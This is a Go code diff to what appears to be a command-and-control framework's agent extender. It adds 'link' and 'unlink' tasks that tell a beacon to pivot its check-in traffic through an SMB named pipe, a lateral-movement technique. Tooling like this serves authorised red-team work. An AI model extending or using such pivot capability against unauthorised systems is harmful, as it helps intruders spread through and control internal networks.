@@ -226,6 +226,12 @@ const (
 	COMMAND_SHELL_START = 71
 	COMMAND_SHELL_WRITE = 72
 
+	// SMB named-pipe pivot (free ids in the native numbering, like the
+	// shell pair): link connects the check-in transport to a named pipe,
+	// unlink closes it (beacon: crates/core/src/transport.rs).
+	COMMAND_LINK   = 73
+	COMMAND_UNLINK = 74
+
 	// Tunnels (native numbering; TCP only — the original specter's
 	// tunnel.c is TCP-only too). Tasks ride TunnelCallbacks (PROXY_DATA),
 	// per-connection I/O rides TUNNEL_START/WRITE/CLOSE/ACCEPT records.
@@ -1126,6 +1132,19 @@ func (e *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[stri
 			}
 		}
 		array = []interface{}{COMMAND_EXEC_BOF, async, "go", len(bofContent), bofContent, len(params), params}
+
+	case "link":
+		var pipe string
+		pipe, err = getStringArg(args, "pipe")
+		if err != nil {
+			goto RET
+		}
+		array = []interface{}{COMMAND_LINK, pipe}
+		messageData.Message = fmt.Sprintf("Task: link pivot %s", pipe)
+
+	case "unlink":
+		array = []interface{}{COMMAND_UNLINK}
+		messageData.Message = "Task: unlink pivot"
 
 	case "terminate":
 		if subcommand == "thread" {
